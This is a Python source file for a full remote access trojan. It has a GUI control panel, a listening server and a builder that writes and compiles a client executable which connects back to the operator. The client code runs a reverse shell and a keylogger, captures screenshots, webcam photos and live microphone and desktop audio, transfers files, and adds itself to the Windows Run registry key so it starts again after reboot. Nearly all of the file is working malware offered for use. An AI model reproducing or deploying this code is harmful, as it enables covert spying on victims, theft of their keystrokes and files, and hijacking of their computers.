import customtkinter as ctk
import socket
import os
import sys
import base64
import io
import time
from threading import Thread, Event
from tkinter import filedialog, messagebox, simpledialog
from PIL import Image, ImageTk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import pyaudio  # for playing mic/desktop audio on the server side

# AES KEY/IV must match what's in the client
AES_KEY = b"THIS_IS_16BYTKEY"  # 16 bytes key
AES_IV  = b"IV_IS_16_BYTE_IV"   # 16 bytes IV

def encrypt_data(plaintext: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(plaintext, AES.block_size))

def decrypt_data(ciphertext: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

def create_client_file(ip, port, directory):
    # Generate client.py with the same AES key/IV
    client_code = f'''
import socket
import subprocess
import threading
import io
import base64
import sys
import os

try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False

try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False

import getpass
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

AES_KEY = b"THIS_IS_16BYTKEY"
AES_IV  = b"IV_IS_16_BYTE_IV"

def encrypt_data(b: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return c.encrypt(pad(b, AES.block_size))

def decrypt_data(b: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(c.decrypt(b), AES.block_size)

keylog_running = False
keylog_buffer = ""

def start_keylogger():
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    global keylog_running, keylog_buffer
    keylog_running = True
    keylog_buffer = ""
    import keyboard
    def on_key(e):
        global keylog_buffer
        if e.name == "space":
            keylog_buffer += " "
        else:
            keylog_buffer += e.name
    keyboard.on_press(on_key)
    return "[CLIENT] Keylogger started."

def stop_keylogger():
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    global keylog_running
    keylog_running = False
    import keyboard
    keyboard.unhook_all()
    return "[CLIENT] Keylogger stopped."

def get_keylog():
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    global keylog_running, keylog_buffer
    if not keylog_running:
        return "[CLIENT] Keylogger not running."
    if not keylog_buffer:
        return "[CLIENT] No keys typed yet."
    return keylog_buffer

def screenshot():
    if not PIL_AVAILABLE:
        return "[CLIENT] Screenshot not available (PIL missing)."
    try:
        from PIL import ImageGrab, Image
        if hasattr(Image, 'Resampling'):
            rmethod = Image.Resampling.LANCZOS
        else:
            rmethod = Image.LANCZOS
        img = ImageGrab.grab()
        img = img.resize((800,600), rmethod)
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        raw = buf.getvalue()
        return "[SCREENSHOT_DATA]" + base64.b64encode(raw).decode('utf-8')
    except Exception as e:
        traceback.print_exc()
        return f"[CLIENT] Screenshot error: {{e}}"

def shell_command(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return f"[CLIENT] Shell command error: {{e}}"

def add_registry():
    if not WINREG_AVAILABLE:
        return "[CLIENT] 'winreg' missing."
    try:
        import winreg
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        exe_path = sys.executable
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS) as k:
            try:
                winreg.DeleteValue(k, "MyRatClient")
            except FileNotFoundError:
                pass
            winreg.SetValueEx(k, "MyRatClient", 0, winreg.REG_SZ, exe_path)
        return "[CLIENT] MyRatClient registry key added."
    except Exception as e:
        return f"[CLIENT] Registry add error: {{e}}"

def remove_registry():
    if not WINREG_AVAILABLE:
        return "[CLIENT] 'winreg' missing."
    try:
        import winreg
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS) as k:
            winreg.DeleteValue(k, "MyRatClient")
        return "[CLIENT] MyRatClient registry key removed."
    except FileNotFoundError:
        return "[CLIENT] Registry key not found."
    except Exception as e:
        return f"[CLIENT] Registry remove error: {{e}}"

def upload_file(args):
    parts = args.split()
    if len(parts) < 3:
        return "[CLIENT] usage: upload <remotefile> <base64enc>"
    remotefile = parts[1]
    enc_b64 = parts[2]
    try:
        enc = base64.b64decode(enc_b64)
        dec = decrypt_data(enc)
        with open(remotefile, "wb") as f:
            f.write(dec)
        return f"[CLIENT] Uploaded => {{remotefile}}"
    except Exception as e:
        return f"[CLIENT] Upload fail: {{e}}"

def download_file(args):
    parts = args.split()
    if len(parts) < 2:
        return "[CLIENT] usage: download <remotefile>"
    remotefile = parts[1]
    try:
        with open(remotefile, "rb") as f:
            raw = f.read()
        enc = encrypt_data(raw)
        b64 = base64.b64encode(enc).decode("utf-8")
        return "[DOWNLOAD_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] Download fail: {{e}}"

def dir_b(path_val):
    cmd = f'dir /b "{{path_val}}"'
    return shell_command(cmd)

def webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "[CLIENT] Webcam not opened."
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return "[CLIENT] Could not read frame."
        success, encimg = cv2.imencode(".png", frame)
        if not success:
            return "[CLIENT] Could not encode webcam image."
        b64 = base64.b64encode(encimg.tobytes()).decode("utf-8")
        return "[WEBCAM_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] Webcam error: {{e}}"

def mic_record(args):
    try:
        import pyaudio
        parts = args.split()
        secs = 5
        if len(parts) > 1:
            try:
                secs = int(parts[1])
            except:
                secs = 5
        chunk = 1024
        fmt = pyaudio.paInt16
        ch = 1
        rate = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=fmt, channels=ch, rate=rate, input=True, frames_per_buffer=chunk)
        frames = []
        for i in range(0, int(rate/chunk*secs)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        raw = b"".join(frames)
        enc = encrypt_data(raw)
        b64 = base64.b64encode(enc).decode("utf-8")
        return "[MIC_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] Mic error: {{e}}"

def desktop_audio(args):
    try:
        import pyaudio
        parts = args.split()
        secs = 5
        if len(parts) > 1:
            try:
                secs = int(parts[1])
            except:
                secs = 5
        chunk = 1024
        fmt = pyaudio.paInt16
        ch = 2
        rate = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=fmt, channels=ch, rate=rate, input=True, frames_per_buffer=chunk)
        frames = []
        for i in range(0, int(rate/chunk*secs)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        raw = b"".join(frames)
        enc = encrypt_data(raw)
        b64 = base64.b64encode(enc).decode("utf-8")
        return "[DESKTOP_AUDIO]" + b64
    except Exception as e:
        return f"[CLIENT] Desktop audio error: {{e}}"

def handle_command(line):
    sp = line.strip().split(maxsplit=1)
    base = sp[0].lower()
    if base == "exit":
        return "exit"
    elif base == "start_keylog":
        return start_keylogger()
    elif base == "stop_keylog":
        return stop_keylogger()
    elif base == "get_keylog":
        return get_keylog()
    elif base == "screenshot":
        return screenshot()
    elif base == "shell":
        if len(sp) > 1:
            return shell_command(sp[1])
        else:
            return "[CLIENT] usage: shell <cmd>"
    elif base == "add_startup":
        return add_registry()
    elif base == "remove_startup":
        return remove_registry()
    elif base == "upload":
        return upload_file(line)
    elif base == "download":
        return download_file(line)
    elif base == "dirb":
        if len(sp) > 1:
            return dir_b(sp[1])
        else:
            return dir_b(".")
    elif base == "webcam_photo":
        return webcam_photo()
    elif base == "mic_record":
        return mic_record(line)
    elif base == "desktop_audio":
        return desktop_audio(line)
    else:
        return shell_command(line)

def send_output(sk, text):
    b = text.encode("utf-8", errors="replace")
    ln = str(len(b)) + "\\n"
    sk.sendall(ln.encode("utf-8"))
    sk.sendall(b)

def recv_cmd(sk):
    ln = b""
    while True:
        c = sk.recv(1)
        if not c:
            return ""
        if c == b"\\n":
            break
        ln += c
    try:
        sz = int(ln.decode("utf-8", errors="replace"))
    except ValueError:
        return ""
    data = b""
    while len(data) < sz:
        chunk = sk.recv(sz - len(data))
        if not chunk:
            break
        data += chunk
    return data.decode("utf-8", errors="replace")

def connect():
    import sys
    print(f"[DEBUG] Attempting to connect to {ip}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{ip}", {port}))
        print("[DEBUG] Connected successfully!")
    except Exception as e:
        print("[DEBUG] Connection error:", e)
        sys.exit(1)
    while True:
        cmd = recv_cmd(s)
        if not cmd:
            break
        if cmd.lower().strip() == "exit":
            break
        out = handle_command(cmd)
        if out == "exit":
            send_output(s, "Client exiting.")
            break
        else:
            send_output(s, out)
    s.close()

if __name__=="__main__":
    connect()
'''
    client_py_path = os.path.join(directory, "client.py")
    with open(client_py_path, "w", encoding="utf-8") as f:
        f.write(client_code)
    hidden = (
        "--hidden-import=keyboard --hidden-import=PIL.ImageGrab "
        "--hidden-import=Crypto.Cipher --hidden-import=cv2 --hidden-import=pyaudio"
    )
    pyinst_cmd = (
        f'pyinstaller --onefile --distpath "{directory}" '
        f'{hidden} '
        f'--name client "{client_py_path}"'
    )
    os.system(pyinst_cmd)
    print(f"Client EXE generated in {directory} as client.exe")


class RATApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Python RAT - Debug Connect, no --noconsole")
        self.geometry("1000x700")
        ctk.set_appearance_mode("System")
        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(fill="both", expand=True)
        self.client_gen_tab = self.tabview.add("Client Generator")
        self.server_tab = self.tabview.add("Server")
        self.control_panel_tab = self.tabview.add("Control Panel")
        self.setup_client_gen()
        self.setup_server()
        self.setup_control_panel()
        self.clients = {}
        self.server_socket = None
        self.screen_view_events = {}

    def setup_client_gen(self):
        f = ctk.CTkFrame(self.client_gen_tab)
        f.pack(expand=True, fill="both")
        ctk.CTkLabel(f, text="Generate a Client EXE with debug connect()", font=("Arial", 18)).pack(pady=20)
        ctk.CTkLabel(f, text="Server IP:").pack()
        self.ip_entry = ctk.CTkEntry(f, placeholder_text="127.0.0.1")
        self.ip_entry.pack(pady=5)
        ctk.CTkLabel(f, text="Port:").pack()
        self.port_entry = ctk.CTkEntry(f, placeholder_text="4444")
        self.port_entry.pack(pady=5)
        self.directory_path = None
        browse_btn = ctk.CTkButton(f, text="Choose Save Directory", command=self.browse_dir)
        browse_btn.pack(pady=5)
        gen_btn = ctk.CTkButton(f, text="Generate Client EXE", command=self.gen_client)
        gen_btn.pack(pady=5)

    def browse_dir(self):
        self.directory_path = filedialog.askdirectory()
        if self.directory_path:
            print("Selected directory:", self.directory_path)

    def gen_client(self):
        ip = self.ip_entry.get().strip()
        port_s = self.port_entry.get().strip()
        if not self.directory_path:
            print("No directory selected.")
            return
        if not ip or not port_s:
            print("Please enter IP and port.")
            return
        try:
            p_int = int(port_s)
        except ValueError:
            print("Port must be integer.")
            return
        create_client_file(ip, p_int, self.directory_path)
        print("Client generation complete. Run client.exe from CMD to see debug prints if it fails.")

    def setup_server(self):
        f = ctk.CTkFrame(self.server_tab)
        f.pack(expand=True, fill="both")
        ctk.CTkLabel(f, text="Server Setup", font=("Arial", 18)).pack(pady=20)
        ctk.CTkLabel(f, text="Listen IP").pack()
        self.server_ip_entry = ctk.CTkEntry(f, placeholder_text="0.0.0.0")
        self.server_ip_entry.pack(pady=5)
        ctk.CTkLabel(f, text="Listen Port").pack()
        self.server_port_entry = ctk.CTkEntry(f, placeholder_text="4444")
        self.server_port_entry.pack(pady=5)
        start_btn = ctk.CTkButton(f, text="Start Server", command=self.start_server)
        start_btn.pack(pady=10)

    def start_server(self):
        ip = self.server_ip_entry.get().strip() or "0.0.0.0"
        port_s = self.server_port_entry.get().strip() or "4444"
        try:
            p_i = int(port_s)
        except ValueError:
            print("Invalid port, using 4444.")
            p_i = 4444
        def srv_thread():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((ip, p_i))
            s.listen(5)
            print(f"Server listening on {ip}:{p_i}")
            self.server_socket = s
            while True:
                c, addr = s.accept()
                ip_port = f"{addr[0]}:{addr[1]}"
                print("Connection from", ip_port)
                self.clients[ip_port] = c
                self.update_client_list()
        t = Thread(target=srv_thread, daemon=True)
        t.start()

    def setup_control_panel(self):
        f = ctk.CTkFrame(self.control_panel_tab)
        f.pack(expand=True, fill="both")
        f.grid_columnconfigure(0, weight=1)
        f.grid_columnconfigure(1, weight=1)
        f.grid_columnconfigure(2, weight=1)
        ctk.CTkLabel(f, text="Control Panel", font=("Arial", 18)).grid(row=0, column=0, columnspan=3, pady=10)
        ctk.CTkLabel(f, text="Select a Client").grid(row=1, column=0, columnspan=3, pady=5)
        self.client_option = ctk.CTkOptionMenu(f, values=[])
        self.client_option.grid(row=2, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")
        shell_btn = ctk.CTkButton(f, text="Reverse Shell", command=self.open_shell)
        shell_btn.grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        keylog_btn = ctk.CTkButton(f, text="Keylogger", command=self.open_keylogger)
        keylog_btn.grid(row=3, column=1, padx=5, pady=5, sticky="ew")
        sc_btn = ctk.CTkButton(f, text="Screenshot", command=self.take_screenshot)
        sc_btn.grid(row=3, column=2, padx=5, pady=5, sticky="ew")
        live_screen_btn = ctk.CTkButton(f, text="Live Screen", command=self.live_screen)
        live_screen_btn.grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        add_btn = ctk.CTkButton(f, text="Add to Startup", command=self.add_startup)
        add_btn.grid(row=4, column=1, padx=5, pady=5, sticky="ew")
        rm_btn = ctk.CTkButton(f, text="Remove Startup", command=self.remove_startup)
        rm_btn.grid(row=4, column=2, padx=5, pady=5, sticky="ew")
        up_btn = ctk.CTkButton(f, text="Upload File", command=self.upload_file)
        up_btn.grid(row=5, column=0, padx=5, pady=5, sticky="ew")
        dn_btn = ctk.CTkButton(f, text="Download File", command=self.download_file)
        dn_btn.grid(row=5, column=1, padx=5, pady=5, sticky="ew")
        fm_btn = ctk.CTkButton(f, text="File Manager", command=self.file_manager)
        fm_btn.grid(row=5, column=2, padx=5, pady=5, sticky="ew")
        wc_btn = ctk.CTkButton(f, text="Webcam Photo", command=self.webcam_photo)
        wc_btn.grid(row=6, column=0, padx=5, pady=5, sticky="ew")
        mic_btn = ctk.CTkButton(f, text="Live Mic", command=self.live_mic_stream)
        mic_btn.grid(row=6, column=1, padx=5, pady=5, sticky="ew")
        da_btn = ctk.CTkButton(f, text="Live Desktop Audio", command=self.live_desktop_stream)
        da_btn.grid(row=6, column=2, padx=5, pady=5, sticky="ew")

    def get_sel_client(self):
        s = self.client_option.get()
        if not s or s not in self.clients:
            print("No valid client selected.")
            return None
        return s

    def open_shell(self):
        c = self.get_sel_client()
        if not c:
            return
        w = ctk.CTkToplevel(self)
        w.title(f"Reverse Shell - {c}")
        w.geometry("600x400")
        txt = ctk.CTkTextbox(w, wrap="word")
        txt.pack(fill="both", expand=True, padx=5, pady=5)
        e = ctk.CTkEntry(w, placeholder_text="shell <cmd>")
        e.pack(pady=5)
        def do_cmd():
            com = e.get().strip()
            if not com:
                return
            r = self.send_cmd(c, com)
            txt.insert("end", f"\n> {com}\n{r}\n")
        b = ctk.CTkButton(w, text="Send", command=do_cmd)
        b.pack(pady=5)

    def open_keylogger(self):
        c = self.get_sel_client()
        if not c:
            return
        start_resp = self.send_cmd(c, "start_keylog")
        print("Keylogger start:", start_resp)
        w = ctk.CTkToplevel(self)
        w.title(f"Keylogger - {c}")
        w.geometry("500x300")
        box = ctk.CTkTextbox(w, wrap="word")
        box.pack(fill="both", expand=True, padx=5, pady=5)
        stop_evt = Event()
        def poll():
            while not stop_evt.is_set():
                time.sleep(1)
                logs = self.send_cmd(c, "get_keylog")
                if logs.startswith("[CLIENT]") or logs == "Connection lost.":
                    continue
                box.delete("0.0", "end")
                box.insert("end", logs)
        thr = Thread(target=poll, daemon=True)
        thr.start()
        def on_cl():
            stop_evt.set()
            time.sleep(0.2)
            sp = self.send_cmd(c, "stop_keylog")
            print("Keylogger stop:", sp)
            w.destroy()
        w.protocol("WM_DELETE_WINDOW", on_cl)

    def take_screenshot(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "screenshot")
        if r.startswith("[SCREENSHOT_DATA]"):
            b64d = r[len("[SCREENSHOT_DATA]"):]
            try:
                raw = base64.b64decode(b64d)
                im = Image.open(io.BytesIO(raw))
            except Exception as e:
                print("Screenshot decode error:", e)
                return
            w = ctk.CTkToplevel(self)
            w.title(f"Screenshot - {c}")
            w.geometry("400x300")
            tkimg = ImageTk.PhotoImage(im)
            lb = ctk.CTkLabel(w, text="")
            lb.pack()
            lb.configure(image=tkimg)
            lb.image = tkimg
        else:
            print(r)

    def live_screen(self):
        c = self.get_sel_client()
        if not c:
            return
        w = ctk.CTkToplevel(self)
        w.title(f"Live Screen - {c}")
        w.geometry("400x300")
        lb = ctk.CTkLabel(w, text="")
        lb.pack()
        st = Event()
        self.screen_view_events[c] = st
        def poll():
            while not st.is_set():
                time.sleep(1)
                resp = self.send_cmd(c, "screenshot")
                if resp.startswith("[SCREENSHOT_DATA]"):
                    b64d = resp[len("[SCREENSHOT_DATA]"):]
                    try:
                        raw = base64.b64decode(b64d)
                        im = Image.open(io.BytesIO(raw))
                    except Exception as e:
                        print("Live screen decode error:", e)
                        continue
                    tim = ImageTk.PhotoImage(im)
                    lb.configure(image=tim)
                    lb.image = tim
                else:
                    print(resp)
        thr = Thread(target=poll, daemon=True)
        thr.start()
        def on_cl():
            st.set()
            time.sleep(0.2)
            w.destroy()
        w.protocol("WM_DELETE_WINDOW", on_cl)

    def add_startup(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "add_startup")
        print("Add Startup:", r)

    def remove_startup(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "remove_startup")
        print("Remove Startup:", r)

    def upload_file(self):
        c = self.get_sel_client()
        if not c:
            return
        local = filedialog.askopenfilename()
        if not local:
            return
        remot = simpledialog.askstring("Remote file", "Path on client?")
        if not remot:
            return
        try:
            with open(local, "rb") as f:
                raw = f.read()
            enc = encrypt_data(raw)
            b64enc = base64.b64encode(enc).decode("utf-8")
            cmd = f"upload {remot} {b64enc}"
            resp = self.send_cmd(c, cmd)
            print("Upload resp:", resp)
        except Exception as e:
            print("Upload error:", e)

    def download_file(self):
        c = self.get_sel_client()
        if not c:
            return
        remotfile = simpledialog.askstring("Download", "Remote file path on client?")
        if not remotfile:
            return
        local = filedialog.asksaveasfilename()
        if not local:
            return
        cmd = f"download {remotfile}"
        r = self.send_cmd(c, cmd)
        if r.startswith("[DOWNLOAD_DATA]"):
            b64d = r[len("[DOWNLOAD_DATA]"):]
            try:
                enc = base64.b64decode(b64d)
                dec = decrypt_data(enc)
                with open(local, "wb") as ff:
                    ff.write(dec)
                print("Downloaded =>", local)
            except Exception as ex:
                print("Download decode error:", ex)
        else:
            print("Download error:", r)

    def file_manager(self):
        c = self.get_sel_client()
        if not c:
            return
        fm_win = ctk.CTkToplevel(self)
        fm_win.title(f"File Manager - {c}")
        fm_win.geometry("600x400")
        current_path = ["."]
        path_var = ctk.StringVar(value=current_path[0])
        path_label = ctk.CTkLabel(fm_win, textvariable=path_var)
        path_label.pack(pady=5)
        scroll_frame = ctk.CTkScrollableFrame(fm_win)
        scroll_frame.pack(fill="both", expand=True, padx=5, pady=5)
        def refresh_file_list():
            for widget in scroll_frame.winfo_children():
                widget.destroy()
            cmd = f'dirb "{current_path[0]}"'
            listing = self.send_cmd(c, cmd)
            items = listing.splitlines()
            for item in items:
                btn = ctk.CTkButton(scroll_frame, text=item, fg_color="transparent",
                                     hover_color="#3E3E3E", command=lambda i=item: open_item(i))
                btn.pack(fill="x", pady=2, padx=5)
        def open_item(item):
            test_path = os.path.join(current_path[0], item)
            test_cmd = f'shell "dir \\"{test_path}\\""'
            test_resp = self.send_cmd(c, test_cmd)
            if "File Not Found" in test_resp:
                ans = messagebox.askyesno("Download?", f"Download '{test_path}'?")
                if ans:
                    sp = filedialog.asksaveasfilename()
                    if sp:
                        d_r = self.send_cmd(c, f'download "{test_path}"')
                        if d_r.startswith("[DOWNLOAD_DATA]"):
                            b64d = d_r[len("[DOWNLOAD_DATA]"):]
                            try:
                                enc = base64.b64decode(b64d)
                                dec = decrypt_data(enc)
                                with open(sp, "wb") as ff:
                                    ff.write(dec)
                                messagebox.showinfo("Downloaded", f"Saved => {sp}")
                            except Exception as ex:
                                messagebox.showerror("Error", f"Decode error: {ex}")
                        else:
                            messagebox.showerror("Download error", d_r)
            else:
                new_path = os.path.join(current_path[0], item)
                current_path[0] = new_path
                path_var.set(new_path)
                refresh_file_list()
        up_btn = ctk.CTkButton(fm_win, text="Up", command=lambda: go_up())
        up_btn.pack(pady=5)
        def go_up():
            new_path = os.path.dirname(current_path[0])
            if new_path == "":
                new_path = "."
            current_path[0] = new_path
            path_var.set(new_path)
            refresh_file_list()
        refresh_file_list()

    def webcam_photo(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "webcam_photo")
        if r.startswith("[WEBCAM_DATA]"):
            b64d = r[len("[WEBCAM_DATA]"):]
            try:
                raw = base64.b64decode(b64d)
                im = Image.open(io.BytesIO(raw))
                w = ctk.CTkToplevel(self)
                w.title(f"Webcam Photo - {c}")
                w.geometry("400x300")
                tkimg = ImageTk.PhotoImage(im)
                lb = ctk.CTkLabel(w, text="")
                lb.pack()
                lb.configure(image=tkimg)
                lb.image = tkimg
            except Exception as e:
                print("Webcam decode error:", e)
        else:
            print(r)

    def live_mic_stream(self):
        c = self.get_sel_client()
        if not c:
            return
        win = ctk.CTkToplevel(self)
        win.title(f"Live Mic Stream - {c}")
        win.geometry("400x200")
        status_label = ctk.CTkLabel(win, text="Click Start to stream mic audio")
        status_label.pack(pady=10)
        streaming = [False]
        import pyaudio
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        def start_stream():
            if streaming[0]:
                return
            streaming[0] = True
            def stream_thread():
                while streaming[0]:
                    r = self.send_cmd(c, "mic_record 1")
                    if r.startswith("[MIC_DATA]"):
                        b64d = r[len("[MIC_DATA]"):]
                        try:
                            enc = base64.b64decode(b64d)
                            dec = decrypt_data(enc)
                            stream.write(dec)
                        except Exception as e:
                            print("Mic stream error:", e)
                    else:
                        print("Mic stream error:", r)
            Thread(target=stream_thread, daemon=True).start()
        def stop_stream():
            streaming[0] = False
            stream.stop_stream()
            stream.close()
            p.terminate()
        start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
        start_btn.pack(pady=5)
        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
        stop_btn.pack(pady=5)

    def live_desktop_stream(self):
        c = self.get_sel_client()
        if not c:
            return
        win = ctk.CTkToplevel(self)
        win.title(f"Live Desktop Audio Stream - {c}")
        win.geometry("400x200")
        status_label = ctk.CTkLabel(win, text="Click Start to stream desktop audio")
        status_label.pack(pady=10)
        streaming = [False]
        import pyaudio
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=2, rate=44100, output=True)
        def start_stream():
            if streaming[0]:
                return
            streaming[0] = True
            def stream_thread():
                while streaming[0]:
                    r = self.send_cmd(c, "desktop_audio 1")
                    if r.startswith("[DESKTOP_AUDIO]"):
                        b64d = r[len("[DESKTOP_AUDIO]"):]
                        try:
                            enc = base64.b64decode(b64d)
                            dec = decrypt_data(enc)
                            stream.write(dec)
                        except Exception as e:
                            print("Desktop audio stream error:", e)
                    else:
                        print("Desktop audio stream error:", r)
            Thread(target=stream_thread, daemon=True).start()
        def stop_stream():
            streaming[0] = False
            stream.stop_stream()
            stream.close()
            p.terminate()
        start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
        start_btn.pack(pady=5)
        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
        stop_btn.pack(pady=5)

    def send_cmd(self, client_key, command):
        if client_key not in self.clients:
            return "No such client."
        sock = self.clients[client_key]
        try:
            data = command.encode("utf-8", errors="replace")
            lstr = str(len(data)) + "\n"
            sock.sendall(lstr.encode("utf-8"))
            sock.sendall(data)
            return self.recv_msg(sock)
        except (ConnectionResetError, OSError):
            print("Connection lost with", client_key)
            return "Connection lost."

    def recv_msg(self, sock):
        ln = b""
        while True:
            c = sock.recv(1)
            if not c:
                return ""
            if c == b"\n":
                break
            ln += c
        try:
            sz = int(ln.decode("utf-8", errors="replace"))
        except ValueError:
            return ""
        data = b""
        while len(data) < sz:
            chunk = sock.recv(sz - len(data))
            if not chunk:
                break
            data += chunk
        return data.decode("utf-8", errors="replace")

    def update_client_list(self):
        arr = list(self.clients.keys())
        self.client_option.configure(values=arr)
        cur = self.client_option.get()
        if arr and cur not in arr:
            self.client_option.set(arr[0])

if __name__=="__main__":
    app = RATApp()
    app.mainloop()
